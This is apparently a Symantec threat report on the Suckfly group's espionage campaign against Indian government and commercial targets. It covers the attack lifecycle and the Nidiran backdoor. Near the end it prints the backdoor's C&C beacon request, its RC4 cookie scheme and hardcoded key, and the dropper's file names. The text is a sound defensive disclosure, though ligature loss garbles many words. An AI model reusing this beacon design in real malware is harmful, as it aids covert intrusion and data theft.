In March 2016, Symantec published a blog on Suck y, an advanced cyberespionage group
(http://www.symantec.com/connect/blogs/suck y-revealing-secret-life-your-code-signing-certi cates)
that conducted attacks against a number of South Korean organizations to steal digital certi cates.
Since then we have identi ed a number of attacks over a two-year period, beginning in April 2014,
which we attribute to Suck y. The attacks targeted high-pro le targets, including government and
commercial organizations. These attacks occurred in several di erent countries, but our investigation
revealed that the primary targets were individuals and organizations primarily located in India.
While there have been several Suck y campaigns that infected organizations with the group’s custom
malware Backdoor.Nidiran (https://www.symantec.com/security_response/writeup.jsp?docid=2015120123-5521-99), the Indian targets show a greater amount of post-infection activity than targets in
other regions. This suggests that these attacks were part of a planned operation against speci c
targets in India.
Campaign activity in India
The rst known Suck y campaign began in April of 2014. During our investigation of the campaign, we
identi ed a number of global targets across several industries who were attacked in 2015. Many of the
targets we identi ed were well known commercial organizations located in India. These organizations
included:
One of India's largest nancial organizations
A large e-commerce company
The e-commerce company's primary shipping vendor
One of India's top ve IT rms
A United States healthcare provider's Indian business unit
Two government organizations
Suck y spent more time attacking the government networks compared to all but one of the
commercial targets. Additionally, one of the two government organizations had the highest infection
rate of the Indian targets. Figure 1 shows the infection rate for each of the targets.

Figure 1. Infection rates of Indian targets
Indian government org #2 is responsible for implementing network software for di erent ministries
and departments within India's central government. The high infection rate for this target is likely
because of its access to technology and information related to other Indian government organizations.
Suck y's attacks on government organizations that provide information technology services to other
government branches is not limited to India. It has conducted attacks on similar organizations in Saudi
Arabia, likely because of the access that those organizations have.
Suck y's targets are displayed in gure 2 by their industry, which provides a clearer view of the group’s
operations. Most of the group's attacks are focused on government or technology related companies
and organizations.

Suck y attack lifecycle
One of the attacks we investigated provided detailed insight into how Suck y conducts its operations.
In 2015, Suck y conducted a multistage attack between April 22 and May 4 against an e-commerce
organization based in India. Similar to its other attacks, Suck y used the Nidiran back door along with
a number of hacktools to infect the victim's internal hosts. The tools and malware used in this breach
were also signed with stolen digital certi cates (http://www.symantec.com/connect/blogs/keepingyour-code-signing-certi cate-straight-and-narrow). During this time the following events took place:

Figure 3. Suck y attack lifecycle
1. Suck y's rst step was to identify a user to target so the attackers could attempt their initial breach
into the e-commerce company's internal network. We don't have hard evidence of how Suck y
obtained information on the targeted user, but we did nd a large open-source presence on the
initial target. The target's job function, corporate email address, information on work related
projects, and publicly accessible personal blog could all be freely found online.
2. On April 22, 2015, Suck y exploited a vulnerability on the targeted employee's operating system
(Windows) that allowed the attackers to bypass the User Account Control and install the Nidiran
back door to provide access for their attack. While we know the attackers used a custom dropper to
install the back door, we do not know the delivery vector. Based on the amount of open-source
information available on the target, it is feasible that a spear-phishing email may have been used.
3. After the attackers successfully exploited the employee’s system, they gained access to the ecommerce company's internal network. We found evidence that Suck y used hacktools to move
latterly and escalate privileges. To do this the attackers used a signed credential-dumping tool to
obtain the victim's account credentials. With the account credentials, the attackers were able to
access the victim's account and navigate the internal corporate network as though they were the
employee.
4. On April 27, the attackers scanned the corporate internal network for hosts with ports 8080, 5900,

and 40 open. Ports 8080 and 5900 are common ports used with legitimate protocols, but can be
abused by attackers when they are not secured. It isn't clear why the attackers scanned for hosts
with port 40 open because there isn't a common protocol assigned to this port. Based on Suck y
scanning for common ports, it’s clear that the group was looking to expand its foothold on the ecommerce company's internal network.
5. The attackers’ nal step was to ex ltrate data o the victim’s network and onto Suck y’s
infrastructure. While we know that the attackers used the Nidiran back door to steal information
about the compromised organization, we do not know if Suck y was successful in stealing other
information.
These steps were taken over a 13-day period, but only on speci c days. While tracking what days of the
week Suck y used its hacktools, we discovered that the group was only active Monday through Friday.
There was no activity from the group on weekends. We were able to determine this because the
attackers’ hacktools are command line driven and can provide insight into when the operators are
behind keyboards actively working. Figure 4 shows the attackers’ activity levels throughout the week.

This activity supports our theory, mentioned in the previous Suck y blog
(http://www.symantec.com/connect/blogs/suck y-revealing-secret-life-your-code-signing-certi cates),
that this is a professional organized group.
Suck y's command and control infrastructure
Suck y made its malware di cult to analyze to prevent their operations from being detected.
However, we were able to successfully analyze Suck y malware samples and extract some of the

communications between the Nidiran back door and the Suck y command and control (C&C)
domains.
We analyzed the dropper, which is an executable that contains the following three les:
1. dllhost.exe: The main host for the .dll le
2. iviewers.dll: Used to load encrypted payloads and then decrypt them
3. ms ed: The encrypted payload
All three les are required for the malware to run correctly. Once the malware has been executed, it
checks to see if it has a connection to the internet before running. If the connection test is successful,
the malware runs and attempts to communicate with the C&C domain over ports 443 and 8443. In the
samples we analyzed we found the port and C&C information encrypted and hardcoded into the
Nidiran malware itself. The Nidiran back door made the following initial communication request to the
Suck y C&C domain:
GET /gte_ok0/logon.php HTTP/1.1
Accept: */*
Accept-Encoding: gzip, de ate
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR
1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152;
.NET CLR 3.5.30729)
Host: REDACTED
Connection: Keep-Alive
Cookie:
dfe6=OIAXUNXWn9CBmFBqtwEEPLzwRGmbMoNR7C0nLcHYa+C1tb4fp7ydcZSmVZ1c4akergWcQQ==
The interesting information being transmitted to the C&C server in the initial request is located in the
cookie which is comprised of the following:
[COOKIE NAME]=[RC4 ENCRYPTED + B64 ENCODED DATA FROM VICTIM]
The key for the RC4 encryption in this sample is the hardcoded string “h0le”. Once the cookie data is
decoded, Suck y has the network name, hostname, IP address, and the victim's operating system
information.
Information about the C&C infrastructure identi ed in our analysis of Suck y activity can be seen in
Table 1.

Table. Suck y C&C infrastructure information
Conclusion
Suck y targeted one of India’s largest e-commerce companies, a major Indian shipping company, one
of India’s largest nancial organizations, and an IT rm that provides support for India’s largest stock
exchange. All of these targets are large corporations that play a major role in India’s economy. By
targeting all of these organizations together, Suck y could have had a much larger impact on India and
its economy. While we don't know the motivations behind the attacks, the targeted commercial
organizations, along with the targeted government organizations, may point in this direction.
Suck y has the resources to develop malware, purchase infrastructure, and conduct targeted attacks
for years while staying o the radar of security organizations. During this time they were able to steal
digital certi cates from South Korean companies and launch attacks against Indian and Saudi Arabian
government organizations. There is no evidence that Suck y gained any bene ts from attacking the
government organizations, but someone else may have bene ted from these attacks.
The nature of the Suck y attacks suggests that it is unlikely that the threat group orchestrated these
attacks on their own. We believe that Suck y will continue to target organizations in India and similar
organizations in other countries in order to provide economic insight to the organization behind
Suck y's operations.
